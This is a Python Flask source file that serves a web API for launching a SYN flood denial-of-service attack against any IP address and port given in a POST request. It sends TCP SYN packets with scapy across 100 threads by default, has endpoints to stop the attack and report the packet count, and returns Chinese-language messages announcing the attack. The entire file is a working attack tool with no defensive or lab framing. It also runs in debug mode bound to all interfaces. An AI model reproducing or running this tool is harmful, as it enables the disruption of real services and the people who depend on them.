from flask import Flask, request, jsonify
from flask_cors import CORS
import threading
from scapy.all import IP, TCP, send
import random

app = Flask(__name__)
CORS(app)

packet_count = 0
attack_running = False
attack_lock = threading.Lock()

def syn_flood(target_ip, target_port):
    global packet_count, attack_running
    while attack_running:
        try:
            ip = IP(dst=target_ip)
            tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
            packet = ip / tcp
            send(packet, verbose=0)
            packet_count += 1
        except Exception as e:
            print(f"Error in SYN flood: {e}")

def start_attack(target_ip, target_port, threads_count):
    global attack_running
    with attack_lock:
        attack_running = True
    for _ in range(threads_count):
        thread = threading.Thread(target=syn_flood, args=(target_ip, target_port))
        thread.daemon = True
        thread.start()

@app.route('/example/test', methods=['POST'])
def start_dos():
    data = request.get_json()
    target_ip = data.get("target_ip")
    target_port = data.get("target_port")
    threads_count = data.get("threads_count", 100)

    if not target_ip or not target_port:
        return jsonify({"message": "缺少必要参数 target_ip 或 target_port", "status": "error"}), 400

    threading.Thread(target=start_attack, args=(target_ip, target_port, threads_count)).start()
    return jsonify({"message": f"已启动针对 {target_ip}:{target_port} 的 DOS 攻击", "status": "success"}), 200

@app.route('/example/stop', methods=['POST'])
def stop_attack():
    global attack_running
    with attack_lock:
        attack_running = False
    return jsonify({"message": "已停止 DOS 攻击", "status": "success"}), 200

@app.route('/example/status', methods=['GET'])
def attack_status():
    return jsonify({"packet_count": packet_count, "attack_running": attack_running}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
